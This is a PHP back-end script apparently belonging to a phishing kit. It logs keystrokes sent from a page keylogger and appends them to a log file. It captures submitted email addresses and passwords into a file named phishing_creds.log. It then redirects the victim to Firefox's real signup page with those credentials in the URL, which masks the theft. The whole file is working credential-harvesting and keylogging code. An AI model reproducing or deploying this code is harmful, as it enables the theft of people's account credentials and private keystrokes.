<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua = substr($_SERVER['HTTP_USER_AGENT'] ?? 'unknown', 0, 100);
    
    // KEYSTROKES
    $raw_input = file_get_contents('php://input');
    if (strpos($raw_input, '"type":"keystrokes"') !== false) {
        $data = json_decode($raw_input, true);
        $keys = array_column($data['data'] ?? [], 'key');
        $clean_keys = implode('', $keys);
        $total = $data['total'] ?? 0;
        
        $log = sprintf("[%s] IP: %s | Keys: %s | Total: %d\n", date('H:i:s'), $ip, $clean_keys, $total);
        file_put_contents('/var/log/keystrokes.log', $log, FILE_APPEND | LOCK_EX);
        echo json_encode(['status' => 'keys_logged']);
        
    } else {
        $email = $_POST['email'] ?? 'N/A';
        $pass = $_POST['password'] ?? 'N/A';
        
        $log = sprintf("[%s] IP: %s | EMAIL: %s | PASS: %s | UA: %s\n", date('H:i:s'), $ip, $email, $pass, $ua);
        file_put_contents('/var/log/phishing_creds.log', $log, FILE_APPEND | LOCK_EX);
        
        // REDIRECT TO FIREFOX SIGNUP WITH BOTH CREDS
        $redirect_url = "https://accounts.firefox.com/signup?email=" . urlencode($email) . "&newPassword=" . urlencode($pass);
        header('Location: ' . $redirect_url);
        exit();
    }
} else {
    header('Location: login.html');
    exit();
}
?>
